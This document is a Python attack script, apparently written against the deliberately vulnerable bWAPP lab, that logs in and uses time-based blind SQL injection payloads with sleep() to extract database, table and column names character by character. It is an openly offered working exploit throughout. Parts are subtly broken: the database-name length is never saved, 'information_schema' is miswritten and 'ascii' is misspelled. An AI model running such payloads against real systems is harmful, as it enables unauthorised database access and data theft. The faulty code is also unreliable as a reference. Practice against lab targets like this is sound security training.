#!/usr/bin/python3
# -*- coding: UTF-8 -*-
# Author: QianTian

import requests
import time

login_data = {
    'login': 'bee',
    'password': 'bug',
    'security_level': '0',
    'form': 'submit'
}

url = "http://{}/"
login_tail = "login.php"
target_tail = "sqli_15.php?title=World War Z' {} AND sleep(3) -- &action=search"


class Injector:
    def __init__(self, ip):
        self.ip = ip
        self.seesion = requests.session()
        self.url = url.format(ip)
        self.login_url = self.url + login_tail
        self.target_model = self.url + target_tail
        self.dbname_len = None
        self.dbname = None
        self.tablename_lens = []
        self.tablename_num = []
        self.cloum_lens = []
        self.username_lens = []

    def keep_login(self):
        """保持登陆状态"""
        respon = self.seesion.post(self.login_url, login_data)
        if respon.status_code == 200:
            print("Login Success!")
        else:
            print("Login Fail!")

    def get_dbname_len(self):
        """获取数据库名的长度"""
        for i in range(1, 21):
            elem = 'AND length(database())=%d' % i
            url = self.target_model.format(elem)
            starttime = time.time()
            respon = self.seesion.get(url)
            endtime = time.time()
            usetime = endtime - starttime
            if usetime > 1:
                print("Length os DB name is ", i)
                break

    def get_dbname(self):
        """获取数据库名称"""
        dbname = ''
        for i in range(1, self.dbname_len + 1):
            for j in range(3, 128):
                elem = "AND ascii(substr(database(),%d,1))=%d" % (i, j)
                url = self.target_model.format(elem)
                starttime = time.time()
                respon = self.seesion.get(url)
                endtime = time.time()
                usetime = endtime - starttime
                if usetime > 1:
                    dbname = dbname + chr(j)
                    break
        self.dbname = dbname
        print("'{}' is the local DB !".format(self.dbname))

    def get_tablename_num(self):
        """获取表的数量"""
        for i in range(1, 50):
            elem = "UNION (SELECT COUNT(table_name) FROM information.tables WHERE \
            table_schema='{}')={}".format(self.dbname, i)
            url = self.target_model.format(elem)
            starttime = time.time()
            respon = self.seesion.get(url)
            endtime = time.time()
            usetime = endtime - starttime
            if usetime > 1:
                self.tablename_num = i
                break

    def guess_get_tablename(self):
        """猜测表名"""
        tablename = input("Please guess tablename:")
        elem = "UNION SELECT TABLE_NAME FROM information.{} WHERE \
        TABLE_NAME='{}'".format(self.dbname, tablename)
        url = self.target_model.format(elem)
        starttime = time.time()
        respon = self.seesion.get(url)
        endtime = time.time()
        usetime = endtime - starttime
        if usetime > 1:
            print("Table '{}' is survival!")
        else:
            print("Table '{}' is died!")

    def get_tablename_lens(self):
        """获取所有表名的长度"""
        for i in range(1, 21):
            elem = 'UNION SELECT TABLE_NAME FROM information.{} WHERE \
            length(TABLENAME)={}'.format(self.dbname, i)
            url = self.target_model.format(elem)
            starttime = time.time()
            respon = self.seesion.get(url)
            endtime = time.time()
            usetime = endtime - starttime
            if usetime > 1:
                self.tablename_lens.append(i)

    def get_tablename_next(self):
        """获取表名的下一个字母"""
        str = input('Please input tablename head')
        length = len(str)
        _str = None
        for j in range(3, 128):
            elem = 'UNION SELECT table_name FROM information.{} WHERE \
            substr(table_name,{},{})={} asscii(substr(table_name,{},1))={}'. \
                format(self.dbname, length, length, str, length + 1, j)
            url = self.target_model.format(elem)
            starttime = time.time()
            respon = self.seesion.get(url)
            endtime = time.time()
            usetime = endtime - starttime
            if usetime > 1:
                _str = str
                _str = _str + chr(j)
                print("Table '{}*' is survival!".format(_str))
        if not _str:
            print("'{}' is the final tablename!".format(str))

    def get_column_lens(self, tablename):
        """获取指定表的所有字段的长度"""
        for i in range(1, 21):
            elem = "UNION SELECT column_name FROM information.columns WHERE \
             table_name='{}' AND length(column)={}".format(tablename,i)
            url = self.target_model.format(elem)
            starttime = time.time()
            respon = self.seesion.get(url)
            endtime = time.time()
            usetime = endtime - starttime
            if usetime > 1:
                self.cloum_lens.append(i)

    def get_column_num(self, tablename):
        """获取所有字段的个数"""
        for i in range(1, 50):
            elem = "UNION (SELECT COUNT(column_name) FROM information.columns WHERE \
            table_name='{}')={}".format(tablename, i)
            url = self.target_model.format(elem)
            starttime = time.time()
            respon = self.seesion.get(url)
            endtime = time.time()
            usetime = endtime - starttime
            if usetime > 1:
                self.cloum_lens = i
                break

    def get_column_next(self):
        """获取字段的下一个字母"""
        table = input("Please input tablename:")
        str = input('Please input column head:')
        length = len(str)
        _str = None
        for j in range(3, 128):
            elem = "UNION SELECT columns FROM information.columns WHERE table_name='{}' AND substr(columns,{},{})={} AND asscii(substr(table_name,{},1))={}".format(table, length, length, str, length + 1, j)
            url = self.target_model.format(elem)
            starttime = time.time()
            respon = self.seesion.get(url)
            endtime = time.time()
            usetime = endtime - starttime
            if usetime > 1:
                _str = str
                _str = _str + chr(j)
                print("Columns '{}*' is survival!".format(_str))
        if not _str:
            print("'{}' is the final Colums!".format(str))


if __name__ == '__main__':
    tool = Injector('0.0.0.0')
    tool.keep_login()
    tool.get_dbname_len()
    tool.get_dbname()
